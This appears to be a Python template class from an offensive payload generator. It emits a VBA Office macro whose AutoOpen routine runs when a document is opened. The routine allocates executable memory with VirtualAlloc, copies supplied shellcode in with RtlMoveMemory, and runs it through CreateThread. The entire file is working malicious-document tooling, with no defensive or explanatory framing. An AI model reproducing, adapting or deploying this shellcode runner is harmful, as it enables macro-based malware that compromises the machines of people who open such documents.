class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr',
        'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr',
        'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
        return f"""
{imports}

{codeblocks}

Sub AutoOpen()
  Dim shellcode As Variant
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As LongPtr

  
  {transformers}

  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
  addr = VirtualAlloc(0, UBound(shellcode), &H3000, &H40)

  For counter = LBound(shellcode) To UBound(shellcode)
    data = shellcode(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
"""